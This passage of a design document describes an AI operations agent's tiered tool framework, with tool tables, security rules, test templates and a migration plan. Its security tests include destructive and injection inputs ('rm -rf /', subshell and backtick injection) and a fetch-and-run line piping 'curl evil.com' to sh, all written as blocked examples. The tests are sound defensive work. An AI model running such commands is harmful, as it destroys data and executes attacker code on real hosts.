| 8 | `storage` | storage | 10 | 6/2/2/0 | EBS/EFS/S3 operations |

**Total**: 103 tools across 8 Skills.

### 7.2 Skill Details

#### 7.2.1 `linux_admin` — Linux System Administrator (RHCE)

**Role**: OS-level diagnostics and management. The foundation Skill.

| Tool | Tier | Wraps | Description |
|------|------|-------|-------------|
| `process_analysis` | T0 | `ps aux`, `top -bn1` | Process table + CPU/mem sort |
| `resource_stats` | T0 | `free`, `uptime`, `/proc/loadavg` | System resource summary |
| `disk_analysis` | T0 | `df -h`, `du -sh`, `lsblk` | Disk usage + mount points |
| `io_stats` | T0 | `iostat -x 1 3` | I/O wait, throughput, latency |
| `network_diagnose` | T0 | `ping`, `traceroute`, `mtr`, `dig` | Basic connectivity from host |
| `file_search` | T0 | `find`, `grep -r` | File/content search |
| `log_tail` | T0 | `tail -f`, `journalctl` | Log viewing with filters |
| `systemd_status` | T0 | `systemctl status`, `list-units` | Service status |
| `user_sessions` | T0 | `who`, `w`, `last` | Active sessions |
| `cron_list` | T0 | `crontab -l`, `systemctl list-timers` | Scheduled tasks |
| `open_files` | T0 | `lsof`, `fuser`, `ss -tlnp` | Open files/ports/sockets |
| `kernel_info` | T0 | `uname -a`, `dmesg --level=err` | Kernel + recent errors |
| `service_restart` | T1 | `systemctl restart <svc>` | Restart specific service |
| `process_signal` | T1 | `kill -TERM`, `kill -HUP` | Graceful process signal |
| `file_edit` | T1 | controlled `sed -i` / write | Config file modification |
| `package_query` | T1 | `apt list`, `rpm -qa` | Package info (read) |
| `process_kill` | T2 | `kill -9` | Forced process termination |
| `system_reboot` | T3 | `shutdown -r`, `reboot` | System reboot (dual approval) |

**Security rules** (`linux_admin/security.py`):
- Allowed commands: whitelist of ~60 diagnostic commands
- Blocked paths: `/etc/shadow`, `/boot`, `/root` (write), `/dev/sd*` (write)
- Injection prevention: via `@secure_tool` decorator (global Layer 1)
- `command_param="command"` on all tools that accept shell input

**Depends on**: (none — foundational Skill)

#### 7.2.2 `kubernetes` — Kubernetes Administrator

**Role**: K8s cluster operations. Migrates from existing `kubectl.py`.

| Tool | Tier | Wraps | Description |
|------|------|-------|-------------|
| `get_resources` | T0 | `kubectl get` | List pods/svc/deploy/... |
| `describe_resource` | T0 | `kubectl describe` | Detailed resource info |
| `get_logs` | T0 | `kubectl logs` | Pod log retrieval |
| `get_events` | T0 | `kubectl get events` | Cluster events sorted by time |
| `top_pods` | T0 | `kubectl top pods` | Resource consumption |
| `top_nodes` | T0 | `kubectl top nodes` | Node-level metrics |
| `api_resources` | T0 | `kubectl api-resources` | Available API types |
| `cluster_info` | T0 | `kubectl cluster-info` | Control plane status |
| `scale_deployment` | T1 | `kubectl scale` | Adjust replica count |
| `rollout_restart` | T1 | `kubectl rollout restart` | Rolling restart |
| `label_resource` | T1 | `kubectl label` | Add/modify labels |
| `annotate_resource` | T1 | `kubectl annotate` | Add/modify annotations |
| `delete_resource` | T2 | `kubectl delete` | Delete resource (needs approval) |
| `cordon_node` | T2 | `kubectl cordon/uncordon` | Node scheduling control |
| `drain_node` | T3 | `kubectl drain` | Evacuate node (dual approval) |

**Security rules** (`kubernetes/security.py`):
- Migrated from `src/aci/operations/kubectl.py` — `DANGEROUS_OPS`, `PROTECTED_NAMESPACES`
- `is_safe_operation()` → integrated into `@secure_tool` decorator
- Namespace filter: `kube-system`, `kube-public`, `kube-node-lease` → T2 minimum
- `--all`, `-A`, `--force` flag detection → tier bump

**Depends on**: (none)

#### 7.2.3 `network_engineer` — Network Engineer (CCIE)

**Role**: Network path analysis, security group audit, routing diagnostics.

| Tool | Tier | Wraps | Description |
|------|------|-------|-------------|
| `trace_route` | T0 | `traceroute`, `mtr` | Multi-hop path with latency |
| `dns_query` | T0 | `dig`, `nslookup` | DNS resolution + record types |
| `tcp_check` | T0 | `nc -zv`, `openssl s_client` | Port reachability + TLS check |
| `arp_table` | T0 | `ip neigh`, `arp -a` | ARP cache / neighbor table |
| `route_table` | T0 | `ip route`, `route -n` | Routing table dump |
| `interface_stats` | T0 | `ip -s link`, `ethtool` | NIC stats, errors, drops |
| `netstat_summary` | T0 | `ss -s`, `ss -tlnp` | Socket summary |
| `packet_capture` | T0 | `tcpdump -c 100` | Limited packet capture (read-only, capped) |
| `bandwidth_test` | T0 | `iperf3 -c` (read) | Throughput measurement |
| `sg_audit` | T1 | AWS API | Security group rules analysis |
| `nacl_audit` | T1 | AWS API | Network ACL analysis |
| `vpc_route_modify` | T1 | AWS API | Route table inspection + diff |
| `sg_rule_modify` | T2 | AWS API | Add/remove SG rules (approval) |
| `nacl_rule_modify` | T2 | AWS API | Add/remove NACL rules (approval) |

**Knowledge** (`network_engineer/knowledge/`):
- `ccie_troubleshoot_flow.md` — Cisco CCIE layered troubleshoot methodology
  - L1 Physical → L2 Data Link → L3 Network → L4 Transport → L7 Application
  - Each layer: symptoms → tools → diagnosis → fix
- `aws_networking_patterns.md` — VPC/TGW/ALB common issues

**Depends on**: `linux_admin` (uses `ip`, `ss`, base network tools)

#### 7.2.4 `aws_general` — AWS Cloud Operations

**Role**: AWS service operations. Replaces the monolithic `aws_ops.py` (1,793 lines, 0% coverage).

| Tool | Tier | Wraps | Description |
|------|------|-------|-------------|
| `ec2_status` | T0 | `describe-instances` | Instance health + status checks |
| `ec2_metrics` | T0 | CloudWatch `GetMetricData` | CPU/Network/EBS metrics |
| `rds_status` | T0 | `describe-db-instances` | RDS health + storage |
| `rds_metrics` | T0 | CloudWatch | Connections/IOPS/Latency |
| `lambda_status` | T0 | `get-function`, `list-functions` | Lambda config + errors |
| `lambda_metrics` | T0 | CloudWatch | Invocations/Duration/Errors |
| `cloudwatch_alarms` | T0 | `describe-alarms` | Alarm state summary |
| `cloudwatch_logs` | T0 | `filter-log-events` | CloudWatch Logs query |
| `ecs_status` | T0 | `describe-services/tasks` | ECS service health |
| `s3_bucket_info` | T0 | `head-bucket`, `get-metrics` | S3 bucket status |
| `ec2_stop_start` | T1 | `stop/start-instances` | EC2 lifecycle (non-prod) |
| `lambda_invoke` | T1 | `invoke` | Lambda test invocation |
| `rds_reboot` | T1 | `reboot-db-instance` | RDS restart |
| `asg_update` | T1 | `update-asg` | ASG desired count |
| `ec2_terminate` | T2 | `terminate-instances` | EC2 termination (approval) |
| `rds_delete` | T2 | `delete-db-instance` | RDS deletion (approval, snapshot first) |

**Migration path**: Extract from `src/aws_ops.py` → decompose into `@secure_tool` functions.
Each tool wraps a specific boto3 call, not the entire `AWSServiceOps` class.

**Depends on**: (none)

#### 7.2.5 `database_admin` — Database Administrator

**Role**: Database diagnostics and operations. Covers RDS/Aurora + generic SQL.

| Tool | Tier | Wraps | Description |
|------|------|-------|-------------|
| `db_status` | T0 | RDS API | Instance status, storage, connections |
| `slow_query_log` | T0 | CloudWatch Logs / PI | Slow query analysis |
| `connection_pool` | T0 | `SHOW PROCESSLIST` / `pg_stat_activity` | Connection status |
| `table_stats` | T0 | `SHOW TABLE STATUS` / `pg_stat_user_tables` | Table size/rows/fragmentation |
| `index_usage` | T0 | `sys.schema_unused_indexes` / PI | Unused/missing indexes |
| `replication_lag` | T0 | `SHOW REPLICA STATUS` | Replication health |
| `deadlock_check` | T0 | `SHOW ENGINE INNODB STATUS` | Current deadlocks |
| `query_explain` | T1 | `EXPLAIN ANALYZE` | Query execution plan |
| `index_create` | T1 | `CREATE INDEX` | Add index (non-blocking) |
| `parameter_modify` | T1 | `modify-db-parameter-group` | RDS parameter change |
| `kill_query` | T2 | `KILL <pid>` | Kill specific query (approval) |
| `table_drop` | T3 | `DROP TABLE` | Table deletion (dual approval + backup) |

**Security rules**:
- SQL injection prevention at Layer 1 (`; DROP`, `UNION SELECT`, etc.)
- Read-only connection by default; write connection requires T1+
- `information_schema` and `performance_schema` always read-only

**Depends on**: (none)

#### 7.2.6 `monitoring` — Monitoring & Alerting

**Role**: Metric queries, alarm management, anomaly detection integration.

| Tool | Tier | Wraps | Description |
|------|------|-------|-------------|
| `check_alarms` | T0 | CloudWatch | Active alarm summary |
| `metric_query` | T0 | CloudWatch `GetMetricData` | Custom metric query |
| `metric_anomaly` | T0 | CW Anomaly Detection | Anomaly band check |
| `dashboard_summary` | T0 | CloudWatch Dashboards | Dashboard snapshot |
| `alarm_history` | T0 | `describe-alarm-history` | Alarm state changes |
| `prometheus_query` | T0 | PromQL via API | Prometheus metric query |
| `grafana_snapshot` | T0 | Grafana API | Dashboard snapshot URL |
| `datadog_query` | T0 | Datadog API (if configured) | Datadog metric query |
| `alarm_suppress` | T1 | `disable-alarm-actions` | Suppress alarm during maintenance |
| `alarm_create` | T1 | `put-metric-alarm` | Create new alarm |

**Depends on**: (none)

#### 7.2.7 `log_analysis` — Log Analysis & Pattern Detection

**Role**: Log querying, pattern extraction, error correlation.

| Tool | Tier | Wraps | Description |
|------|------|-------|-------------|
| `cloudwatch_query` | T0 | Logs Insights | CloudWatch Logs Insights query |
| `log_pattern_detect` | T0 | regex + ML patterns | Detect error/warning patterns |
| `log_timeline` | T0 | Logs Insights | Time-series error count |
| `log_correlate` | T0 | multi-source join | Cross-service log correlation |
| `opensearch_query` | T0 | OpenSearch API | OpenSearch/ES query |
| `structured_extract` | T0 | JSON/regex parsing | Extract structured fields from logs |
| `log_diff` | T0 | compare two time windows | Before/after log comparison |
| `log_export` | T1 | export to S3 | Export log range for deep analysis |

**Depends on**: (none)

#### 7.2.8 `storage` — Storage Operations

**Role**: EBS, EFS, S3, disk I/O operations.

| Tool | Tier | Wraps | Description |
|------|------|-------|-------------|
| `ebs_status` | T0 | `describe-volumes` | Volume state, IOPS, throughput |
| `ebs_metrics` | T0 | CloudWatch | Volume read/write latency |
| `efs_status` | T0 | `describe-file-systems` | EFS throughput mode, connections |
| `s3_usage` | T0 | `list-objects-v2` + metrics | Bucket size, object count |
| `disk_io` | T0 | `iostat`, `iotop` | Host-level I/O analysis |
| `snapshot_list` | T0 | `describe-snapshots` | EBS snapshot inventory |
| `ebs_modify` | T1 | `modify-volume` | Resize/change IOPS (online) |
| `efs_modify` | T1 | `update-file-system` | Throughput mode change |
| `ebs_attach` | T2 | `attach-volume` | Attach volume to instance |
| `ebs_detach` | T2 | `detach-volume` | Detach volume (approval) |

**Depends on**: `linux_admin` (for host-level `df`, `mount`, `lsblk`)

### 7.3 Agent → Skill Binding Matrix

```
                 linux  kube  network  aws    db     monitor  log    storage
                 admin         engnr   genl   admin           anlys
  ┌─────────┬──────┬──────┬──────┬──────┬──────┬──────┬──────┬──────┐
  │ Detect  │  T0  │  T0  │      │  T0  │      │  T0  │  T0  │      │
  │ Agent   │      │      │      │      │      │      │      │      │
  ├─────────┼──────┼──────┼──────┼──────┼──────┼──────┼──────┼──────┤
  │ RCA     │ T0+1 │ T0+1 │ T0+1 │ T0+1 │ T0+1 │ T0+1 │ T0+1 │  T0  │
  │ Agent   │      │      │      │      │      │      │      │      │
  ├─────────┼──────┼──────┼──────┼──────┼──────┼──────┼──────┼──────┤
  │ SRE     │ ALL  │ ALL  │ ALL  │ ALL  │ ALL  │ ALL  │ ALL  │ ALL  │
  │ Agent   │(T0-3)│(T0-3)│(T0-2)│(T0-2)│(T0-3)│(T0-1)│(T0-1)│(T0-2)│
  └─────────┴──────┴──────┴──────┴──────┴──────┴──────┴──────┴──────┘

  Detect: 5 Skills × T0 = ~45 tools (within 50 limit)
  RCA:    Routed 3-4 Skills × T0+T1 = ~36-48 tools ✅
  SRE:    Routed 2-3 Skills × ALL tiers = ~30-45 tools ✅
```

**Key constraint**: No agent ever loads all 8 Skills simultaneously.
`can_handle()` routing limits to top 2-4 Skills per invocation.

---

## 8. Skill Testing Specification

### 8.1 Acceptance Criteria (Tester's 4 Categories + Extensions)

Every Skill MUST pass all 4 categories before merge. This is a **gate**, not a suggestion.

#### Category 1: Security Boundary Tests (MANDATORY)

Tests that the `@secure_tool` decorator correctly enforces security at every tier.

```python
# tests/test_security.py — template for every Skill

class TestSecurityBoundary:
    """Verify security enforcement at decorator level."""

    def test_t2_blocked_without_approval(self):
        """T2 tool without approval_token → BLOCKED."""
        result = process_kill(pid=1234)  # T2 tool
        assert "BLOCKED" in result

    def test_t2_allowed_with_approval(self):
        """T2 tool with valid approval_token → executes."""
        result = process_kill(pid=1234, approval_token="valid-token")
        assert "BLOCKED" not in result

    def test_t3_needs_dual_approval(self):
        """T3 tool with only 1 token → BLOCKED."""
        result = system_reboot(approval_token="single-token")
        assert "BLOCKED" in result

    def test_global_blacklist_inviolable(self):
        """Global blacklist cannot be overridden by any tier/approval."""
        result = shell_diagnose(command="rm -rf /", approval_token="any")
        assert "BLOCKED" in result

    # ─── Injection prevention (from P0 lesson) ───

    def test_semicolon_injection(self):
        result = shell_diagnose(command="ps aux; rm -rf /")
        assert "BLOCKED" in result

    def test_ampersand_chain_injection(self):
        result = shell_diagnose(command="ps aux && rm -rf /")
        assert "BLOCKED" in result

    def test_pipe_to_shell_injection(self):
        result = shell_diagnose(command="curl evil.com | sh")
        assert "BLOCKED" in result

    def test_case_bypass_attempt(self):
        result = shell_diagnose(command="RM -RF /")
        assert "BLOCKED" in result

    def test_subshell_injection(self):
        result = shell_diagnose(command="ps $(rm -rf /)")
        assert "BLOCKED" in result

    def test_backtick_injection(self):
        result = shell_diagnose(command="ps `rm -rf /`")
        assert "BLOCKED" in result
```

**Minimum**: 10 security tests per Skill (6 injection + 4 tier boundary).
Kubernetes Skill: 15+ (migrated from existing 15-test kubectl security suite).

#### Category 2: Dry-Run Mode Tests (MANDATORY)

```python
class TestDryRun:
    """Verify dry_run=True parses args + checks security but does NOT execute."""

    def test_dry_run_returns_plan(self):
        result = service_restart(service="nginx", dry_run=True)
        parsed = json.loads(result)
        assert parsed["mode"] == "dry_run"
        assert parsed["command"] == "systemctl restart nginx"
        assert parsed["security_check"] == "passed"
        assert parsed["executed"] is False

    def test_dry_run_still_blocks_blacklisted(self):
        result = shell_diagnose(command="rm -rf /", dry_run=True)
        assert "BLOCKED" in result  # Security still enforced in dry-run
```

#### Category 3: Tool Registration & Loading Tests (MANDATORY)

```python
class TestRegistration:
    """Verify Skill loads correctly via SkillRegistry."""

    def test_skill_discovered(self):
        registry = SkillRegistry.create_isolated()
        manifests = registry.discover()
        assert "linux_admin" in manifests
        assert manifests["linux_admin"].tool_count == 18

    def test_dependency_resolution(self):
        registry = SkillRegistry.create_isolated()
        registry.discover()
        loaded = registry.load_for_agent("rca", ["network_engineer"], SecurityTier.T1)
        skill_names = [s.manifest.name for s in loaded]
        # network_engineer depends_on linux_admin → auto-loaded
        assert "linux_admin" in skill_names

    def test_missing_dependency_raises(self):
        registry = SkillRegistry.create_isolated()
        registry.discover()
        # network_engineer needs linux_admin, but we only discover network_engineer
        # (in isolation without linux_admin available)
        with pytest.raises(ValueError, match="depends on"):
            registry._resolve_dependencies(["network_engineer"])

    def test_tier_filtering(self):
        registry = SkillRegistry.create_isolated()
        registry.discover()
        loaded = registry.load_for_agent("detect", ["linux_admin"], SecurityTier.T0_READONLY)
        tools = loaded[0].tools
        # All tools should be T0
        for t in tools:
            assert t._skill_meta["tier"] <= SecurityTier.T0_READONLY

    def test_tool_count_limit(self):
        """Loading too many Skills warns and truncates."""
        registry = SkillRegistry.create_isolated()
        registry.discover()
        loaded = registry.load_for_agent("sre", ["ALL"], SecurityTier.T3_DESTRUCTIVE)
        tools = registry.get_tools(loaded)
        assert len(tools) <= 50
```

#### Category 4: Cross-Skill Security Inheritance Tests (MANDATORY)

```python
class TestCrossSkillSecurity:
    """Verify global blacklist applies across ALL Skills."""

    @pytest.mark.parametrize("skill_name", [
        "linux_admin", "kubernetes", "network_engineer", "aws_general",
        "database_admin", "monitoring", "log_analysis", "storage",
    ])
    def test_global_blacklist_all_skills(self, skill_name):
        """Every Skill's command tools must respect global blacklist."""
        registry = SkillRegistry.create_isolated()
        registry.discover()
        loaded = registry.load_for_agent("sre", [skill_name], SecurityTier.T3_DESTRUCTIVE)
        for tool in loaded[0].tools:
            if tool._skill_meta.get("command_param"):
                result = tool(command="rm -rf /")
                assert "BLOCKED" in result

    def test_skill_whitelist_cannot_override_global(self):
        """Even if linux_admin whitelists 'rm', global blacklist wins."""
        # This test verifies Layer 1 > Layer 3 precedence
        result = file_edit(path="/etc/shadow", content="hacked")
        assert "BLOCKED" in result
```

### 8.2 Invariant Gate Test

```python
def test_all_tools_have_secure_decorator():
    """
    INVARIANT: Every @tool in src/skills/ MUST be wrapped by @secure_tool.
    Tools without @secure_tool decorator are a security risk.
    
    Similar to test_dangerous_tools_have_security_filter() from kubectl suite.
    """
    import ast
    import pathlib

    skills_dir = pathlib.Path("src/skills")
    violations = []

    for tool_file in skills_dir.rglob("tools.py"):
        tree = ast.parse(tool_file.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                decorators = [
                    d.func.id if isinstance(d, ast.Call) and hasattr(d.func, "id")
                    else d.id if isinstance(d, ast.Name)
                    else None
                    for d in node.decorator_list
                ]
                if "tool" in decorators and "secure_tool" not in decorators:
                    violations.append(f"{tool_file}::{node.name}")

    assert not violations, f"Tools without @secure_tool: {violations}"
```

### 8.3 Test Count Targets

| Skill | Security | Dry-Run | Registration | Cross-Skill | Total Min |
|-------|----------|---------|--------------|-------------|-----------|
| `linux_admin` | 12 | 5 | 4 | 2 | **23** |
| `kubernetes` | 15 | 5 | 4 | 2 | **26** |
| `network_engineer` | 10 | 4 | 5 | 2 | **21** |
| `aws_general` | 10 | 5 | 4 | 2 | **21** |
| `database_admin` | 12 | 4 | 4 | 2 | **22** |
| `monitoring` | 8 | 3 | 3 | 2 | **16** |
| `log_analysis` | 8 | 3 | 3 | 2 | **16** |
| `storage` | 10 | 4 | 4 | 2 | **20** |
| **Registry** | — | — | 12 | 8 | **20** |
| **Total** | **85** | **33** | **43** | **24** | **~185** |

Plus the invariant gate test and ~10 integration tests = **~200 tests target**.

---

## 9. Migration Plan

### 9.1 Existing Code → Skills Mapping

| Current File | Lines | Target Skill | Migration Type |
|-------------|-------|-------------|---------------|
| `src/aci/operations/kubectl.py` | 265 | `kubernetes/` | **Refactor** — extract tools, keep security model |
| `src/aci/operations/shell.py` | 98 | `linux_admin/` | **Wrap** — ShellExecutor becomes internal |
| `src/aci/security/filters.py` | 168 | `_security.py` | **Promote** — becomes global Layer 1 |
| `src/aci/topology/tools.py` | 162 | `kubernetes/` (partial) | **Reference** — keep as-is, add Skill metadata |
| `src/aws_ops.py` | 1,793 | `aws_general/` + `database_admin/` + `storage/` | **Decompose** — break monolith into Skill tools |
| `src/kubectl_wrapper.py` | 265 | `kubernetes/` | **Absorb** — merge into kubernetes/tools.py |

### 9.2 Backward Compatibility

During migration, existing code paths continue to work:

```python
# Phase 1: Skill wrappers delegate to existing code
# kubernetes/tools.py
@secure_tool(tier=SecurityTier.T0_READONLY, skill="kubernetes", command_param=None)
def get_resources(resource_type: str, namespace: str = "default") -> str:
    """List Kubernetes resources."""
    # Delegate to existing KubectlExecutor (no behavior change)
    from src.aci.operations.kubectl import KubectlExecutor
    executor = KubectlExecutor(cluster_name="testing-cluster", region="ap-southeast-1")
    result = executor.execute(["get", resource_type, "-n", namespace])
    return result.stdout if result.status.value == "success" else f"Error: {result.error}"
```

Phase 2: Gradually move logic into Skill tools, deprecate old paths.
Phase 3: Remove old files, update all imports.

---

## 10. Implementation Plan

### Phase 1: Framework + kubernetes/ Reference Skill (~3 days)

**Deliverables:**
- `src/skills/__init__.py` — SkillRegistry (§5.2)
- `src/skills/_security.py` — `@secure_tool`, SecurityTier, GLOBAL_BLACKLIST (§4.3)
- `src/skills/_models.py` — ToolResult, SkillManifest re-export
- `src/skills/_executor.py` — shared ShellExecutor / AWSExecutor
- `src/skills/kubernetes/` — full Skill with 15 tools, migrated from kubectl.py
- Tests: 26 kubernetes + 20 registry = **46 tests**

**Validation gate**: `pytest src/skills/ -v` — all pass, zero security bypass.

### Phase 2: linux_admin/ + Remaining 5 Skills (~3 days)

**Deliverables:**
- `src/skills/linux_admin/` — 18 tools (reference Skill for shell-based tools)
- `src/skills/network_engineer/` — 14 tools + CCIE knowledge
- `src/skills/aws_general/` — 16 tools (decomposed from aws_ops.py)
- `src/skills/database_admin/` — 12 tools
- `src/skills/monitoring/` — 10 tools
- `src/skills/log_analysis/` — 8 tools
- `src/skills/storage/` — 10 tools
- Tests: ~140 new tests (see §8.3)

**Validation gate**: 185+ Skill tests pass. aws_ops.py coverage > 50%.

### Phase 3: Agent Integration + Routing (~2 days)

**Deliverables:**
- DetectAgent → `SkillRegistry.load_for_agent("detect", [...], T0)`
- RCA Agent → `SkillRegistry.load_for_agent("rca", [...], T1)` + `delegate_to_sre()`
- SRE Agent → `SkillRegistry.load_for_agent("sre", ["ALL"], T3)`
- IncidentOrchestrator → `can_handle()` routing integration
- `approval_token` flow from Orchestrator → SRE tools
- Tests: ~20 integration tests

**Validation gate**: E2E pipeline works with Skill-backed tools. Regression green.

### Phase 4: Polish + Knowledge Bases (~1 day)

**Deliverables:**
- Knowledge directories populated (CCIE troubleshoot flow, K8s runbooks)
- SKILL.md bodies finalized with tier-segmented content
- Documentation: update ARCHITECTURE.md, API_REFERENCE.md
- Old code cleanup: deprecation warnings on direct kubectl/shell usage

**Total estimate**: ~9 days (3 + 3 + 2 + 1)

---

## 11. Appendix: Interface Stubs

### 11.1 Skill Registration Entry Point

Each Skill's `__init__.py`:

```python
# src/skills/linux_admin/__init__.py

from src.skills import SkillRegistry
from .tools import (
    process_analysis, resource_stats, disk_analysis, io_stats,
    network_diagnose, file_search, log_tail, systemd_status,
    user_sessions, cron_list, open_files, kernel_info,
    service_restart, process_signal, file_edit, package_query,
    process_kill, system_reboot,
)
from . import security as skill_security

def register():
    """Called on import — registers this Skill with the global registry."""
    registry = SkillRegistry.get()
    registry.register_skill(
        name="linux_admin",
        tools=[
            process_analysis, resource_stats, disk_analysis, io_stats,
            network_diagnose, file_search, log_tail, systemd_status,
            user_sessions, cron_list, open_files, kernel_info,
            service_restart, process_signal, file_edit, package_query,
            process_kill, system_reboot,
        ],
        security_policy=skill_security,
    )

register()
```

### 11.2 Complete Tool Example

```python
# src/skills/linux_admin/tools.py

from src.skills._security import secure_tool, SecurityTier
from src.skills._executor import ShellExecutor

_shell = ShellExecutor(safe_mode=True)


@secure_tool(tier=SecurityTier.T0_READONLY, skill="linux_admin")
def process_analysis(sort_by: str = "cpu", top_n: int = 20) -> str:
    """
    Analyze running processes sorted by resource consumption.

    Combines ps, top, and /proc data for a comprehensive view.

    Args:
        sort_by: Sort key - 'cpu', 'mem', 'pid', or 'time'
        top_n: Number of top processes to return (max 50)

    Returns:
        JSON with process list, system load, and memory summary.
    """
    top_n = min(top_n, 50)
    sort_flag = {"cpu": "-pcpu", "mem": "-pmem", "pid": "-pid", "time": "-etime"}.get(sort_by, "-pcpu")

    result = _shell.execute(f"ps aux --sort={sort_flag} | head -n {top_n + 1}")
    load = _shell.execute("cat /proc/loadavg")
    mem = _shell.execute("free -h")

    return json.dumps({
        "processes": _parse_ps(result.stdout),
        "load_average": load.stdout.strip(),
        "memory": _parse_free(mem.stdout),
        "sort_by": sort_by,
        "top_n": top_n,
    }, indent=2)


@secure_tool(tier=SecurityTier.T2_HIGH_RISK, skill="linux_admin", dry_run_support=True)
def process_kill(pid: int, signal: int = 9, dry_run: bool = False) -> str:
    """
    Force-kill a process. Requires approval_token.

    ⚠️ Tier T2 — use process_signal (T1, SIGTERM) first.
    Only use kill -9 when process is unresponsive to SIGTERM.

    Args:
        pid: Process ID to kill
        signal: Signal number (default 9 = SIGKILL)
        dry_run: If True, validate but do not execute

    Returns:
        Kill result or dry-run plan.
    """
    # Validate PID exists
    check = _shell.execute(f"ps -p {pid} -o pid,comm,user --no-headers")
    if check.status.value != "success":
        return json.dumps({"error": f"PID {pid} not found"})

    result = _shell.execute(f"kill -{signal} {pid}")
    return json.dumps({
        "action": "kill",
        "pid": pid,
        "signal": signal,
        "result": result.status.value,
        "output": result.stdout.strip(),
    })
```

### 11.3 Skill-Level Security Policy

```python
# src/skills/linux_admin/security.py

"""
Linux Admin — Skill-level security policy (Layer 3).

Cannot weaken Global Blacklist (Layer 1).
Can add domain-specific restrictions.
"""

# Commands allowed at each tier
ALLOWED_T0 = {
    "ps", "top", "free", "uptime", "df", "du", "mount", "lsblk",
    "iostat", "vmstat", "sar", "mpstat", "pidstat", "iotop",
    "ping", "traceroute", "mtr", "dig", "nslookup", "host",
    "find", "grep", "awk", "sed", "cat", "head", "tail", "less",
    "wc", "sort", "uniq", "cut", "tr", "tee",
    "journalctl", "dmesg", "uname", "hostnamectl",
    "who", "w", "last", "lastlog", "id", "groups",
    "crontab", "systemctl", "timedatectl",
    "lsof", "fuser", "ss", "netstat", "ip", "ethtool",
    "file", "stat", "md5sum", "sha256sum",
}

ALLOWED_T1 = ALLOWED_T0 | {
    "systemctl restart", "systemctl reload", "systemctl enable", "systemctl disable",
    "kill", "pkill", "killall",  # -TERM/-HUP only, not -9
    "sed -i",  # in-place edit (controlled by file_edit tool)
    "apt list", "dpkg -l", "rpm -qa", "yum list",
}

ALLOWED_T2 = ALLOWED_T1 | {
    "kill -9", "kill -KILL",
}

ALLOWED_T3 = ALLOWED_T2 | {
    "reboot", "shutdown",
}

# Paths that require elevated tier
RESTRICTED_PATHS = {
    "/etc/": "T1",      # Config files
    "/var/log/": "T0",  # Readable
    "/boot/": "T2",     # Boot config
    "/root/": "T2",     # Root home
}

def check(command: str, tier: "SecurityTier") -> tuple[bool, str]:
    """
    Skill-level security check.
    
    Called by @secure_tool decorator after global blacklist (Layer 1).
    """
    base_cmd = command.strip().split()[0] if command.strip() else ""
    
    tier_allowed = {0: ALLOWED_T0, 1: ALLOWED_T1, 2: ALLOWED_T2, 3: ALLOWED_T3}
    allowed = tier_allowed.get(int(tier), ALLOWED_T0)
    
    if base_cmd not in allowed:
        return False, f"Command '{base_cmd}' not in linux_admin tier {tier} allowlist"
    
    return True, "OK"
```

---

## Changelog

| Date | Change | Author |
|------|--------|--------|
| 2026-02-27 | Initial draft (ADR-006) | Architect |

---

## Open Questions for Review

1. **SKILL.md frontmatter vs separate manifest.yaml** — Anthropic uses frontmatter-in-SKILL.md; should we also support standalone `manifest.yaml` for CI/CD tooling?
2. **Tool count per Skill** — 8-18 per Skill. Should we cap at 15 to keep Agent context lean?
3. **HMAC approval_token Phase 2 timeline** — Current "any string" is a known gap. Prioritize before or after all 8 Skills are done?
4. **`scripts/` auto-wrap** — Phase 2 feature: auto-generate `@tool` from shell scripts. Design now or defer?
5. **Knowledge base injection** — Include in Agent prompt or make available via RAG tool?
